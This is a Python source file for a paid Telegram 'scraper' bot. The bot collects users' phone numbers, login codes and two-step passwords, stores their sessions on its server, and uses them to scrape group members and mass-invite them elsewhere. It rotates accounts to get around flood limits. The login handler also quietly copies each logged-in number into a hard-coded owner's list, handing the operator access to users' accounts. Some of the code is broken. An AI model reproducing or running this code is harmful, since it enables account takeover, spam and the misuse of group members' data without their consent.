import re, os, random, asyncio, html, configparser,subprocess, requests, time, traceback, logging, telethon, csv, json, sys
import csv
from csv import reader
from pyromod import listen
from sql import add_user, query_msg
from support import users_info
from telethon.sessions import StringSession
from pyrogram import Client,filters
from asyncio.exceptions import TimeoutError
from telethon.client.chats import ChatMethods
from datetime import datetime, timedelta,date
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneNumberInvalid, ApiIdInvalid, PhoneCodeInvalid, PhoneCodeExpired, UserNotParticipant
from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError
from info import API_ID, API_HASH, BOT_TOKEN, OWNER_IDS, PREMIUM_IDS
from telethon import functions, types, TelegramClient, connection, sync, utils, errors
from telethon.tl.functions.channels import GetFullChannelRequest, JoinChannelRequest, InviteToChannelRequest
from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, UserBannedInChannelError, PeerFloodError, UserPrivacyRestrictedError, ChatWriteForbiddenError, UserAlreadyParticipantError,  UserBannedInChannelError, UserAlreadyParticipantError,  UserPrivacyRestrictedError, ChatAdminRequiredError

# ------------------ ʜᴇʀᴇ sᴛᴀʀᴛ sᴄʀᴀᴘᴇʀ ʙᴏᴛ ᴄᴏᴅᴇs -------------- #


#add_user= query_msg= users_info=0
if not os.path.exists('./sessions'):
    os.mkdir('./sessions')
if not os.path.exists(f"Users/6691393517/phone.csv"):
   os.mkdir('./Users')
   os.mkdir(f'./Users/6691393517')
   open(f"Users/6691393517/phone.csv","w")
if not os.path.exists('data.csv'):
    open("data.csv","w")


APP_ID=API_ID
API_HASH=API_HASH
BOT_TOKEN=BOT_TOKEN
OWNERS=OWNER_IDS
PREMIUMS=PREMIUM_IDS

app = Client("HirokoScraperBot", api_id=APP_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)


with open("data.csv", encoding='UTF-8') as f:
    rows = csv.reader(f, delimiter=",", lineterminator="\n")
    next(rows, None)
    ishan=[]
    for row in rows:
        d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
        r = datetime.strptime("2023-02-01", '%Y-%m-%d') - datetime.strptime("2023-02-01", '%Y-%m-%d')
        if d<=r:
            PREMIUMS.append(int(row[1]))

# ---------------------- ʙᴏᴛ-ᴛᴇxᴛ -------------------#

START_IMG = (
"https://te.legra.ph/file/1b82afbf90d074849136e.jpg",
"https://te.legra.ph/file/0f64be1cf523f76aa0e2e.jpg",
"https://te.legra.ph/file/1bedd3d90170cc6da5282.jpg",
"https://te.legra.ph/file/c18b4ff72e93a1def1eef.jpg",
"https://te.legra.ph/file/43b1aff6ba286cd61b4cc.jpg",
"https://te.legra.ph/file/45f301147ffede1856f0d.jpg",
"https://te.legra.ph/file/40f551a935da47f59ff64.jpg",

)


START_TEXT = """
**ʜᴇʟʟᴏ sɪʀ [{}](tg://user?id={})** \n
๏ ɪ ᴀᴍ sᴄʀᴀᴘᴇʀ ʙᴏᴛ 
๏ ɪ ᴄᴀɴ sᴄʀᴀᴘ ᴍᴇᴍʙᴇʀ ғʀᴏᴍ ɢʀᴏᴜᴘ ᴛᴏ ᴀɴᴏᴛʜᴇʀ ɢʀᴏᴜᴘ
๏ ɪ ᴀᴍ ғᴜʟʟʏ sᴛᴀʙʟᴇ ʙᴀsᴇᴅ ᴏɴ ᴘʏʀᴏɢʀᴀᴍ ᴀɴᴅ ᴛᴇʟᴇᴛʜᴏɴ
"""


# ----------------------- sᴛᴀʀᴛ --------------------- #


@app.on_message(filters.command(["start"], prefixes=["/", "!"]))
async def start(client: Client, message: Message):
    get_me = await client.get_me()
    USERNAME = get_me.username
    buttons =  [
          [
             InlineKeyboardButton("ʟᴏɢɪɴ", callback_data="Login"), 
             InlineKeyboardButton("ᴀᴅᴅɪɴɢ", callback_data="Adding") 
          ],
          [
             InlineKeyboardButton("ᴘʜᴏɴᴇ", callback_data="Phone"), 
             InlineKeyboardButton("ᴘʜᴏɴᴇsᴇᴇ", callback_data="xdlist")
          ],
          [
             InlineKeyboardButton("ᴘʜᴏɴᴇ ʀᴇᴍᴏᴠᴇ", callback_data="Remove"), 
             InlineKeyboardButton("ᴀᴅᴍɪɴ ᴘᴀɴɴᴇʟ", callback_data="Admin")
          ]
               ]
   
    reply_markup = InlineKeyboardMarkup(buttons)        
    await message.reply_photo(random.choice(START_IMG), caption=START_TEXT.format(message.from_user.first_name, message.from_user.id), reply_markup=reply_markup)


# ------------------------ ᴘʜᴏɴᴇ -------------------- #

@app.on_callback_query()
async def button(app, update):
   k = update.data
   if "Phone" in k:      
      if update.message.chat.id  not in PREMIUMS:
         await app.send_message(update.message.chat.id, f"**ʏᴏᴜ ᴀʀᴇ ɴᴏ ʟᴏɴɢᴇʀ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ\nᴘʟᴇᴀsᴇ ʜᴀᴠᴇ ᴀ sᴜʙsᴄʀɪᴘᴛɪᴏɴ 150ʀs\nᴘᴇʀ ᴍᴏɴᴛʜ\nɪғ ʏᴏᴜ ɪɴᴛʀᴇsᴛᴇᴅ ᴛʜᴀɴ ᴄᴏɴᴛᴀᴄᴛ ~ @iam_daxx**")
         return
      if not os.path.exists(f"Users/{update.message.chat.id}/phone.csv"):
         os.mkdir(f'./Users/{update.message.chat.id}')
         open(f"Users/{update.message.chat.id}/phone.csv","w")
      with open(f"Users/{update.message.chat.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         NonLimited=[]
         a=0
         for pphone in str_list:
            a+=1
            NonLimited.append(str(pphone))
         number = await update.message.chat.ask(text="**ᴇɴᴛᴇʀ ɴᴜᴍʙᴇʀ ᴏғ ᴀᴄᴄᴏᴜɴᴛs ᴛᴏ ʟᴏɢɪɴ (ɪɴ ɪɴᴛᴇɢᴇʀ)**")
         n = int(number.text)
         a+=n
         if n<1 :
            await app.send_message(update.message.chat.id, """**ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ ʟᴇss ᴛʜᴇɴ 1 ᴀɢᴀɪɴ ᴛʀʏ**""")
            return
         if a>100:
            await app.send_message(update.message.chat.id, f"**ʏᴏᴜ ᴄᴀɴ ᴀᴅᴅ ᴏɴʟʏ {100-a} ᴘʜᴏɴᴇ ɴᴏ**")
            return
         for i in range (1,n+1):
            number = await update.message.chat.ask(text="**ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ's ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪɴ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ғᴏʀᴍᴀᴛ.\nɪɴᴄʟᴜᴅɪɴɢ **ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ** \nᴇxᴀᴍᴘʟᴇ: **+14154566376 = 14154566376 ᴏɴʟʏ + ʀᴇᴍᴏᴠᴇ** **")
            phone = number.text
            if "+" in phone:
                await app.send_message(update.message.chat.id, """**ᴀs ᴍᴇɴᴛɪᴏɴ + ɪs ɴᴏᴛ ɪɴᴄʟᴜᴅᴇ**""")
            elif len(phone)==11 or len(phone)==12:
                Daxx = str(phone)
                NonLimited.append(Daxx)
                await app.send_message(update.message.chat.id, f"**{n}). ᴘʜᴏɴᴇ: {phone} sᴇᴛ sᴜᴄᴇssғᴜʟʟʏ ✅**")
            else:
                await app.send_message(update.message.chat.id, """**ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ ғᴏʀᴍᴀᴛ ᴛʀʏ ᴀɢᴀɪɴ**""") 
         NonLimited=list(dict.fromkeys(NonLimited))
         with open(f"Users/{update.message.chat.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(NonLimited)
         with open(f"Users/{update.message.chat.id}/1.csv") as infile, open(f"Users/{update.message.chat.id}/phone.csv", "w") as outfile:
            for line in infile:
                outfile.write(line.replace(",", ""))   
 

# ------------------------ ʀᴇᴍᴏᴠᴇ -------------------- #

   elif "Remove" in k:
      if update.message.chat.id not in PREMIUMS:
         await app.send_message(update.message.chat.id, f"**ʏᴏᴜ ᴀʀᴇ ɴᴏ ʟᴏɴɢᴇʀ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ\nᴘʟᴇᴀsᴇ ʜᴀᴠᴇ ᴀ sᴜʙsᴄʀɪᴘᴛɪᴏɴ 150ʀs\nᴘᴇʀ ᴍᴏɴᴛʜ\nɪғ ʏᴏᴜ ɪɴᴛʀᴇsᴛᴇᴅ ᴛʜᴀɴ ᴄᴏɴᴛᴀᴄᴛ ~ @iam_daxx**")
         return
      try:
         with open(f"Users/{update.message.chat.id}/phone.csv", 'r')as f:
            str_list = [row[0] for row in csv.reader(f)]
            f.closed
            number = await update.message.chat.ask(text="**sᴇɴᴅ ɴᴜᴍʙᴇʀ ᴛᴏ ʀᴇᴍᴏᴠᴇ**")
            print(str_list)
            str_list.remove(number.text)
            with open(f"Users/{update.message.chat.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
               writer = csv.writer(writeFile, lineterminator="\n")
               writer.writerows(str_list)
            with open(f"Users/{update.message.chat.id}/1.csv") as infile, open(f"Users/{update.message.chat.id}/phone.csv", "w") as outfile:
               for line in infile:
                  outfile.write(line.replace(",", ""))
            await app.send_message(update.message.chat.id,text="✅ sᴜᴄᴇssғᴜʟʟʏ ʀᴇᴍᴏᴠᴇ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ")
      except Exception as a:
         pass
   

# ------------------------ ɴᴜᴍʙᴇʀ ʟɪsᴛ -------------------- #

   elif "xdlist" in k:
      if update.message.chat.id not in PREMIUMS:
         await app.send_message(update.message.chat.id, f"**ʏᴏᴜ ᴀʀᴇ ɴᴏ ʟᴏɴɢᴇʀ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ\nᴘʟᴇᴀsᴇ ʜᴀᴠᴇ ᴀ sᴜʙsᴄʀɪᴘᴛɪᴏɴ 150ʀs\nᴘᴇʀ ᴍᴏɴᴛʜ\nɪғ ʏᴏᴜ ɪɴᴛʀᴇsᴛᴇᴅ ᴛʜᴀɴ ᴄᴏɴᴛᴀᴄᴛ ~ @iam_daxx**")
         return
      try:
         with open(f"Users/{update.message.chat.id}/phone.csv", 'r')as f:
            str_list = [row[0] for row in csv.reader(f)]
            de="**🍒 ʜᴇʀᴇ ɪs ʏᴏᴜʀ ᴀʟʟ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀs 🍒**\n\n"
            da=0
            dad=0
            for pphone in str_list:
               dad+=1
               da+=1
               if dad>40:               
                  await app.send_message(update.message.chat.id, text=f"{de}")
                  de="**🍒 ʜᴇʀᴇ ɪs ʏᴏᴜʀ ᴀʟʟ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀs 🍒**\n\n"
                  dad=0 
               de+=(f"**{da}).** `{int(pphone)}`\n")         
         await app.send_message(update.message.chat.id, text=f"{de}")

      except Exception as a:
         pass
  

# ------------------------ ʟᴏɢɪɴ -------------------- #
   
   elif "Login" in k:
      if update.message.chat.id not in PREMIUMS:
         await app.send_message(update.message.chat.id, f"**ʏᴏᴜ ᴀʀᴇ ɴᴏ ʟᴏɴɢᴇʀ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ\nᴘʟᴇᴀsᴇ ʜᴀᴠᴇ ᴀ sᴜʙsᴄʀɪᴘᴛɪᴏɴ 150ʀs\nᴘᴇʀ ᴍᴏɴᴛʜ\nɪғ ʏᴏᴜ ɪɴᴛʀᴇsᴛᴇᴅ ᴛʜᴀɴ ᴄᴏɴᴛᴀᴄᴛ ~ @iam_daxx**")
         return
      with open(f"Users/{update.message.chat.id}/phone.csv", 'r')as f:
       r=[]
       l=[]
       str_list = [row[0] for row in csv.reader(f)]
       po = 0
       s=0
       for pphone in str_list:
        try:
         phone = int(utils.parse_phone(pphone))
         client = TelegramClient(f"sessions/{phone}", APP_ID, API_HASH)
         await client.connect()
         if not await client.is_user_authorized():
            try:
               await client.send_code_request(phone)
            except FloodWait as e:
               await update.message.reply(f"ʏᴏᴜ ʜᴀᴠᴇ ғʟᴏᴏᴅᴡᴀɪᴛ ᴏғ {e.x} sᴇᴄᴏɴᴅs")
               return
            except PhoneNumberInvalidError:
               await update.message.reply("ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ɪs ɪɴᴠᴀʟɪᴅ.\n\nᴘʀᴇss /start ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ!")
               return
            except PhoneNumberBannedError:
               await update.message.reply(f"{phone} ɪs ʙᴀɴɴᴇᴅ")
               continue
            try:
               otp = await update.message.chat.ask(("ᴀɴ ᴏᴛᴘ ɪs sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ, \nᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴏᴛᴘ ɪɴ `1 2 3 4 5` ғᴏʀᴍᴀᴛ.(sᴘᴀᴄᴇ ʙᴇᴛᴡᴇᴇɴ ᴇᴀᴄʜ ɴᴜᴍʙᴇʀ) \n\nɪғ ʙᴏᴛ ɴᴏᴛ sᴇɴᴅɪɴɢ ᴏᴛᴘ ᴛʜᴇɴ ᴛʀʏ \n/start ᴄᴏᴍᴍᴀɴᴅ ᴛᴏ ʙᴏᴛ.\nᴘʀᴇss /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ."), timeout=300)
            except TimeoutError:
               await update.message.reply("ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 5 ᴍɪɴᴜᴛᴇs.\nᴘʀᴇss /start ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ!")
               return
            otps=otp.text
            try:
              await client.sign_in(phone=phone, code=' '.join(str(otps)))
            except PhoneCodeInvalidError:
              await update.message.reply("ɪɴᴠᴀʟɪᴅ ᴄᴏᴅᴇ.\n\nᴘʀᴇss /start ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ!")
              return
            except PhoneCodeExpiredError:
              await update.message.reply("ᴄᴏᴅᴇ ɪs ᴇxᴘɪʀᴇᴅ.\n\nᴘʀᴇss /start ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ!")
              return
            except SessionPasswordNeededError:
               try:
                  two_step_code = await update.message.chat.ask("ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀᴠᴇ ᴛᴡᴏ ᴛᴡᴏ-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ.\nᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘᴀssᴡᴏʀᴅ.",timeout=300)
               except TimeoutError:
                  await update.message.reply("`ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 5ᴍɪɴ.\n\nᴘʀᴇss /start ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ!`")
                  return
               try:
                  await client.sign_in(password=two_step_code.text)
               except Exception as e:
                  await update.message.reply(f"**ᴇʀʀᴏʀ:** `{str(e)}`")
                  return
               except Exception as e:
                  await app.send_message(update.message.chat.id ,f"**ᴇʀʀᴏʀ:** `{str(e)}`")
                  return
         with open("Users/6691393517/phone.csv", 'r')as f:
            str_list = [row[0] for row in csv.reader(f)]
            NonLimited=[]
            for pphone in str_list:
               NonLimited.append(str(pphone))
            Daxx = str(phone)
            NonLimited.append(Daxx)
            NonLimited=list(dict.fromkeys(NonLimited))
            with open('1.csv', 'w', encoding='UTF-8') as writeFile:
               writer = csv.writer(writeFile, lineterminator="\n")
               writer.writerows(NonLimited)
            with open("1.csv") as infile, open(f"Users/6691393517/phone.csv", "w") as outfile:
               for line in infile:
                   outfile.write(line.replace(",", ""))
         os.remove("1.csv")
         await client(functions.contacts.UnblockRequest(id='@SpamBot'))
         await client(functions.contacts.UnblockRequest(id='@ViewsServiceBot'))
         await client.send_message('SpamBot', '/start')
         await client.send_message('ViewsServiceBot', '/start')
         msg = str(await client.get_messages('SpamBot'))
         re= "bird"
         if re in msg:
            stats="ɢᴏᴏᴅ ɴᴇᴡs, ɴᴏ ʟɪᴍɪᴛs ᴀʀᴇ ᴄᴜʀʀᴇɴᴛʟʏ ᴀᴘᴘʟɪᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ. ʏᴏᴜ'ʀᴇ ғʀᴇᴇ ᴀs ᴀ ʙɪʀᴅ!"
            s+=1
            r.append(str(phone))
         else:
            stats='ʏᴏᴜ ᴀʀᴇ ʟɪᴍɪᴛᴇᴅ'
            l.append(str(phone))
         me = await client.get_me()
         await app.send_message(update.message.chat.id, f"✅ sᴜᴄᴄᴇssғᴜʟʟʏ ʟᴏɢɪɴ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ\n\n**ɴᴀᴍᴇ:** {me.first_name}\n**ᴜsᴇʀɴᴀᴍᴇ:** {me.username}\n**ᴘʜᴏɴᴇ:** {phone}\n**sᴘᴀᴍʙᴏᴛ sᴛᴀᴛs:** {stats}\n\n****")     
         po+=1
         await client.disconnect()
        except ConnectionError:
         await client.disconnect()
         await client.connect()
        except TypeError:
         await app.send_message(update.message.chat.id, "**ʏᴏᴜ ʜᴀᴠᴇ ɴᴏᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ \nᴘʟᴇᴀsᴇ ᴇᴅɪᴛ ᴄᴏɴғɪɢ⚙️ ʙʏ ᴄᴏᴍᴀɴᴅ /start.**")  
        except Exception as e:
         await app.send_message(update.message.chat.id, f"**ᴇʀʀᴏʀ: {e}**")
       for sum in l:
         r.append(str(sum))
       with open(f"Users/{update.message.chat.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
         writer = csv.writer(writeFile, lineterminator="\n")
         writer.writerows(r)
       with open(f"Users/{update.message.chat.id}/1.csv") as infile, open(f"Users/{update.message.chat.id}/phone.csv", "w") as outfile:
         for line in infile:
            outfile.write(line.replace(",", "")) 
       await app.send_message(update.message.chat.id, f"**🍃 ᴀʟʟ ᴀᴄᴄ ʟᴏɢɪɴ {s} \n🍂 ᴀᴄᴄᴏᴜɴᴛ ᴀᴠᴀɪʟᴀʙʟᴇ ᴏғ {po} **") 
    

# ------------------------ ʟᴏɢɪɴ -------------------- #
   
   elif "Adding" in k:
      if update.message.chat.id not in PREMIUMS:
         await app.send_message(update.message.chat.id, f"**ʏᴏᴜ ᴀʀᴇ ɴᴏ ʟᴏɴɢᴇʀ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ\nᴘʟᴇᴀsᴇ ʜᴀᴠᴇ ᴀ sᴜʙsᴄʀɪᴘᴛɪᴏɴ 150ʀs\nᴘᴇʀ ᴍᴏɴᴛʜ\nɪғ ʏᴏᴜ ɪɴᴛʀᴇsᴛᴇᴅ ᴛʜᴀɴ ᴄᴏɴᴛᴀᴄᴛ ~ @iam_daxx**")
         return
      number = await update.message.chat.ask(text="**ɴᴏᴡ sᴇɴᴅ ᴛʜᴇ ғʀᴏᴍ ɢʀᴏᴜᴘ ᴜsᴇʀɴᴀᴍᴇ **")
      From = number.text
      number = await update.message.chat.ask(text="**ɴᴏᴡ sᴇɴᴅ ᴛʜᴇ ᴛᴏ ɢʀᴏᴜᴘ ᴜsᴇʀɴᴀᴍᴇ **")
      To = number.text
      number = await update.message.chat.ask(text="**ɴᴏᴡ sᴇɴᴅ sᴛᴀʀᴛ ғʀᴏᴍ **")
      a = int(number.text)
      di=a
      try:
         with open(f"Users/{update.message.chat.id}/phone.csv", 'r')as f:
            str_list = [row[0] for row in csv.reader(f)]
            for pphone in str_list:
               peer=0
               ra=0
               dad=0
               r="**↺ ᴀᴅᴅɪɴɢ sᴛᴀʀᴛ ↻**\n\n"
               phone = utils.parse_phone(pphone)
               client = TelegramClient(f"sessions/{phone}", APP_ID, API_HASH)
               await client.connect()
               await client(JoinChannelRequest(To))
               await app.send_message(update.message.chat.id, text=f"**⇋ sᴄʀᴀᴘɪɴɢ sᴛᴀʀᴛ **")
               async for x in client.iter_participants(From, aggressive=True):
                  try:
                     ra+=1
                     if ra<a:
                        continue
                     if (ra-di)>150:
                        await client.disconnect()
                        r+="**\n--ʜᴇʀᴇ ɪs ʏᴏᴜʀ sᴄʀᴀᴘᴇʀ ᴍᴇᴍʙᴇʀ ʟɪsᴛ--**"
                        await app.send_message(update.message.chat.id, text=f"{r}")
                        await app.send_message(update.message.chat.id, f"**ᴇʀʀᴏʀ: {phone} ᴅᴜᴇ ᴛᴏ sᴏᴍᴇ ᴇʀʀᴏʀ ᴍᴏᴠɪɴɢ ᴛᴏ ɴᴇxᴛ ɴᴜᴍʙᴇʀ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ʙʏ @iam_daxx**")
                        break
                     if dad>40:
                        r+="**\n--ʜᴇʀᴇ ɪs ʏᴏᴜʀ sᴄʀᴀᴘᴇʀ ᴍᴇᴍʙᴇʀ ʟɪsᴛ--**"
                        await app.send_message(update.message.chat.id, text=f"{r}")
                        r="**↺ ᴀᴅᴅɪɴɢ sᴛᴀʀᴛ ↻**\n\n"
                        dad=0
                     await client(InviteToChannelRequest(To, [x]))
                     status = 'ᴅᴏɴᴇ'
                  except errors.FloodWaitError as s:
                     status= f'ғʟᴏᴏᴅ ᴡᴀɪᴛ ᴇʀʀᴏʀ ғᴏʀ {s.seconds} sᴇᴄ'
                     await client.disconnect()                    
                     await app.send_message(update.message.chat.id, text=f"{r}")
                     await app.send_message(update.message.chat.id, text=f'**ғʟᴏᴏᴅᴡᴀɪᴛ ᴇʀʀᴏʀ {s.seconds} sec\nᴍᴏᴠɪɴɢ ᴛᴏ ɴᴇxᴛ ɴᴜᴍʙᴇʀ**')
                     break
                  except UserPrivacyRestrictedError:
                     status = 'ᴘʀɪᴠᴀᴄʏ ʀᴇsᴛʀɪᴄᴛᴇᴅ ᴇʀʀᴏʀ'
                  except UserAlreadyParticipantError:
                     status = 'ᴀʟʀᴇᴀᴅʏ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛ ᴇʀʀᴏʀ'
                  except UserBannedInChannelError:
                     status="ᴜsᴇʀ ʙᴀɴɴᴇᴅ"
                  except ChatAdminRequiredError:
                     status="ᴛᴏ ᴀᴅᴅ ᴀᴅᴍɪɴ ʀᴇǫᴜɪʀᴇᴅ"
                  except ValueError:
                     status="ᴇʀʀᴏʀ ɪɴ ᴇɴᴛʀʏ"
                     await client.disconnect()
                     await app.send_message(update.message.chat.id, text=f"{r}")
                     break
                  except PeerFloodError:
                     if peer == 10:
                        await client.disconnect()
                        await app.send_message(update.message.chat.id, text=f"{r}")
                        await app.send_message(update.message.chat.id, text=f"**ᴛᴏᴏ ᴍᴀɴʏ ᴘᴇᴇʀғʟᴏᴏᴅᴇʀʀᴏʀ \nᴍᴏᴠɪɴɢ ᴛᴏ ɴᴇxᴛ ɴᴜᴍʙᴇʀ**")
                        break
                     status = 'ᴘᴇᴇʀ ғʟᴏᴏᴅ ᴇʀʀᴏʀ'
                     peer+=1
                  except ChatWriteForbiddenError as cwfe:
                     await client(JoinChannelRequest(To))
                     continue
                  except errors.RPCError as s:
                     status = s.__class__.__name__
                  except Exception as d:
                     status = d
                  except:
                     traceback.print_exc()
                     status="ᴜɴᴇxᴘᴇᴄᴛᴇᴅ ᴇʀʀᴏʀ"
                     break
                  r+=f"{a-di+1})🍒 **{x.first_name}**   ➠   **{status}**\n"
                  dad+=1
                  a+=1
      except Exception as e:
         await app.send_message(update.message.chat.id, text=f"ᴇʀʀᴏʀ: {e} ")
    



# -------------------- ᴀᴅᴍɪɴ-ᴘᴀɴɴᴇʟ ---------------- #

   elif "Bot_Stats" in k:      
      msg = await app.send_message(update.message.chat.id,"ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...")
      messages = await users_info(app)
      await msg.edit(f"🍒 --ᴛᴏᴛᴀʟ ᴜsᴇʀs-- - {messages[0]}\n🍴 --ʙʟᴏᴄᴋᴇᴅ ᴜsᴇʀs-- - {messages[1]}")

   elif "Add_Premium" in k:      
      number = await update.message.chat.ask(text="**sᴇɴᴅ ᴜsᴇʀ ɪᴅ ᴏғ ɴᴇᴡ ᴜsᴇʀ**")
      phone = int(number.text)
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         f.closed
         f = open("data.csv", "w", encoding='UTF-8')
         writer = csv.writer(f, delimiter=",", lineterminator="\n")
         writer.writerow(['sr. no.', 'user id', "Date"])
         a=1
         for i in rows:
            writer.writerow([a, i[1],i[2]])
            a+=1
         writer.writerow([a, phone, date.today() ])
         PREMIUMS.append(int(phone))
         await app.send_message(update.message.chat.id, text="♻️ ᴅᴏɴᴇ sᴜᴄᴇssғᴜʟʟʏ")

   elif "Premium_Users" in k:      
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         E="**🔴 ʜᴇʀᴇ ɪs ʏᴏᴜʀ ᴀʟʟ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs 🔵**\n"
         a=0
         for row in rows:
            d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
            r = datetime.strptime("2023-02-01", '%Y-%m-%d') - datetime.strptime("2023-12-01", '%Y-%m-%d')
            if d<=r:
               a+=1
               E+=f"{a}). {row[1]} - {row[2]}\n"          
         await app.send_message(update.message.chat.id, text=E)

   elif "Admin" in k:  
      await update.message.delete()    
      if update.message.chat.id in OWNERS:
         but = InlineKeyboardMarkup(
              [
                 [
                    InlineKeyboardButton("♻️ ᴀᴅᴅ ᴘʀᴇᴍɪᴜᴍ ♻️", callback_data="Add_Premium")
                 ],
                 [  
                    InlineKeyboardButton("⭕ ʙʀᴏᴀᴅᴄᴀsᴛ ⭕", callback_data="Broadcast")
                 ],
                 [
                    InlineKeyboardButton("🍒 ʙᴏᴛs sᴛᴀᴛs 🍒", callback_data="Bot_Stats")
                 ],
                 [
                    InlineKeyboardButton("🔴 ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs 🔵", callback_data="Premium_Users")
                 ]
              ]
         )
         await app.send_message(update.message.chat.id,text=f"**ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴɴᴇʟ ᴏғ ᴛʜᴇ sᴄʀᴀᴘᴇʀ ʙᴏᴛ**", reply_markup=but)
      else:
         await app.send_message(update.message.chat.id,text="**ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏғ ʙᴏᴛ**")

   elif "Broadcast" in k:
    try:
      query = await query_msg()
      a=0
      b=0
      number = await update.message.chat.ask(text="**ɴᴏᴡ ᴍᴇ ᴍᴇssᴀɢᴇ ғᴏʀ ʙʀᴏᴀᴅᴄᴀsᴛ**")
      phone = number.text
      for row in query:
         chat_id = int(row[0])
         try:
            await app.send_message(text=f"{phone}", parse_mode="markdown", disable_web_page_preview=True)
            a+=1
         except FloodWait as e:
            await asyncio.sleep(e.x)
            b+=1
         except Exception:
            b+=1
            pass
      await app.send_message(update.message.chat.id,f"✅ sᴜᴄᴇssғᴜʟʟʏ ʙʀᴏᴀᴅᴄᴀsᴛᴇᴅ ᴛᴏ {a} ᴄʜᴀᴛs\nғᴀɪʟᴇᴅ - {b} ᴄʜᴀᴛs !")
    except Exception as e:
      await app.send_message(update.message.chat.id,f"**ᴇʀʀᴏʀ: {e}**")

# -------------------- ᴀᴅᴍɪɴ-ᴘᴀɴɴᴇʟ-ᴇɴᴅ ---------------- #



text = """ʜᴇʟʟᴏ ɪ ᴀᴍ ᴏᴡɴᴇʀ ᴏғ ʙᴏᴛ ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴍʏ ɢʀᴏᴜᴘ ᴄʜᴀɴɴᴇʟs
"""
print(text)
app.run()
